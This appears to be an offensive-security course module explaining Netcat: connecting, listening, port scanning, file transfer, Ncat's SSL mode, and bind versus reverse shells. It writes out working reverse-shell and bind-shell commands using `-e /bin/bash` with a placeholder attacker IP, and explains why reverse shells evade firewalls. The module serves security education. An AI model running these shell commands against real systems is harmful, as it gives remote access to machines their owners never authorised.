# Module 4 - Netcat

## Why this comes right after reconnaissance
Netcat is one of the oldest, most versatile network tools that exists — often called the "Swiss Army knife" of networking. Before diving into Nmap specifically (Module 5), Netcat covers the fundamentals of raw TCP/UDP interaction that Nmap builds on top of.

---

## What Netcat actually is
A simple utility for reading from and writing to network connections directly — TCP or UDP — with no assumptions about what protocol is running on top. Where a web browser only knows how to speak HTTP and an SSH client only knows how to speak SSH, Netcat speaks *nothing in particular* — it just moves raw bytes back and forth, which is exactly what makes it so flexible.

**What it's for, attacker's perspective:** Because Netcat makes no protocol assumptions, it can be used to manually interact with almost any service, transfer files with no dedicated server needed, and — most importantly for offensive use — create reverse and bind shells, giving remote command-line access to a compromised machine.

---

## Basic Commands

**Connecting to a listening port (acting as a client):**
```
nc <target-ip> <port>
```
This opens a raw connection to whatever's listening on that port — useful for banner grabbing (already covered in enumeration content) or manually sending protocol commands by hand to see exactly how a service responds.

**Setting up a listener (acting as a server):**
```
nc -lvp 4444
```
- `-l` — listen mode (wait for an incoming connection instead of initiating one)
- `-v` — verbose (show connection details as they happen)
- `-p 4444` — listen on port 4444 specifically

**Why this matters:** any device can become either the client *or* the server with the same tool — this dual nature is exactly what makes reverse shells possible (below).

---

## Port Scanning with Netcat
Netcat isn't a dedicated scanner like Nmap, but it can perform a basic scan using its connection-attempt behavior:
```
nc -zv <target-ip> 20-25
```
- `-z` — zero-I/O mode, meaning it just checks if a connection *can* be made, without actually sending any data once connected
- `-v` — verbose, so you see the result for each port
- `20-25` — the port range to check

**Why you'd use this over Nmap:** rarely as the primary scanning tool — Nmap is faster and far more feature-rich — but Netcat is frequently *already present* on a compromised machine where Nmap isn't installed, making this a useful fallback during post-exploitation when you're working from inside a target's own limited toolset.

---

## File Transfer with Netcat
Since Netcat just moves raw bytes, it can transfer files with no dedicated file-transfer protocol at all — genuinely useful once you have a foothold on a machine with no other transfer method available.

**On the receiving machine (listener):**
```
nc -lvp 4444 > received_file.txt
```
**On the sending machine:**
```
nc <receiver-ip> 4444 < file_to_send.txt
```
The listener redirects (`>`) whatever it receives directly into a file; the sender redirects (`<`) a file's contents directly into the connection. No authentication, no encryption, no protocol overhead — which is also exactly why this should never be used for sensitive data transfer over an untrusted network, only in controlled lab/pentest scenarios.

---

## NCAT — the modern successor
**Ncat** ships with the Nmap project and is a more modern, actively maintained reimplementation of Netcat's core idea, with real improvements:
- Built-in SSL/TLS encryption support (`--ssl` flag) — genuine encrypted connections, something original Netcat never had
- Better IPv6 support
- Connection brokering/proxying capabilities

```
ncat -lvp 4444 --ssl
```
Same listener setup as before, but now the connection itself is encrypted — worth knowing that Ncat exists specifically because plain Netcat traffic is trivially sniffable (connects back to the sniffing content already covered), which matters if you're relying on Netcat for anything beyond a quick lab exercise.

---

## Reverse Shell vs Bind Shell — the distinction that actually matters

Both give remote command execution on a target, but the *direction of the initial connection* is the entire difference, and that difference has real practical consequences.

### Bind Shell
**How it works:** The target machine listens for an incoming connection, and the attacker connects *to* it.
```
# On the TARGET machine:
nc -lvp 4444 -e /bin/bash

# On the ATTACKER's machine:
nc <target-ip> 4444
```
The `-e /bin/bash` flag tells Netcat to execute a shell and pipe its input/output directly through the connection — anyone who connects gets a working command line on the target.

**Why this is often less useful in real engagements:** the target machine now has to have a port *open and listening*, reachable from the attacker's position. If the target is behind a firewall/NAT (extremely common — most real corporate machines are not directly internet-reachable), the attacker often can't reach that listening port at all.

### Reverse Shell
**How it works:** The direction is flipped — the *attacker's own machine* listens, and the target machine initiates the connection *outward* to the attacker.
```
# On the ATTACKER's machine (set this up FIRST):
nc -lvp 4444

# On the TARGET machine (this is what actually gets executed as the exploit payload):
nc <attacker-ip> 4444 -e /bin/bash
```

**Why this is the far more commonly used technique in real-world exploitation:** outbound connections from inside a network are far less restricted than inbound ones — most firewalls are configured to block unsolicited *incoming* traffic (exactly the security-misconfiguration lesson from the web series, applied at the network level) but allow employees' own machines to make *outbound* connections freely (for normal browsing, updates, etc.). A reverse shell exploits this asymmetry directly — the "attack" traffic looks like the target machine choosing to connect out, not like an attacker breaking in.

## Quick comparison

| | Bind Shell | Reverse Shell |
|---|---|---|
| Who listens | Target machine | Attacker's machine |
| Who initiates the connection | Attacker | Target |
| Common real-world blocker | Target's inbound firewall rules | Rarely blocked — outbound is usually permitted |
| Practical usage frequency | Less common | Far more common in real engagements |

## Quick-reference table

| Command | Purpose |
|---|---|
| `nc <ip> <port>` | Connect to a listening service (client mode) |
| `nc -lvp <port>` | Listen for an incoming connection (server mode) |
| `nc -zv <ip> <range>` | Basic port scan |
| `nc -lvp <port> > file` / `nc <ip> <port> < file` | File transfer (receive/send) |
| `ncat --ssl` | Netcat's modern successor, with real encryption |
| `nc -lvp <port> -e /bin/bash` (on target) | Bind shell |
| `nc <attacker-ip> <port> -e /bin/bash` (on target, attacker listening first) | Reverse shell |
